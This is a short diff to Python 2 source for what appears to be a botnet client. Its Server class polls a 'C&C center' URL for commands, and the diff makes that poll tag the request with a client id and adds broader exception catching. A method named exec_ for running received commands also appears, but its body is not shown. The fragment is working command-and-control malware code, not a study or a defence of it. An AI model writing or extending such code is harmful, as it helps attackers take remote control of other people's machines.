@@ -24,11 +24,14 @@ class Server(object):
         while not succ:
             print 'pulling command from C&C center'
             try:
-                req = urllib2.Request(self.__url + '?from=a@b.com')
+                #req = urllib2.Request('{0}?from={1}'.format(self.__url, 'a@b.com'))
+                req = urllib2.Request('{0}?from={1}'.format(self.__url, self.__id))
                 resp = urllib2.urlopen(req)
                 succ = True
                 return resp.read()
             except urllib2.URLError as e:
+                print e
+            except Exception as e:
                 print e
         pass
     def exec_(self, cmd):
@@ -47,6 +50,8 @@ class Server(object):
                 print resp.info()
                 succ = True
             except urllib2.URLError as e:
+                print e
+            except Exception as e:
                 print e
         pass
     def loop(self):
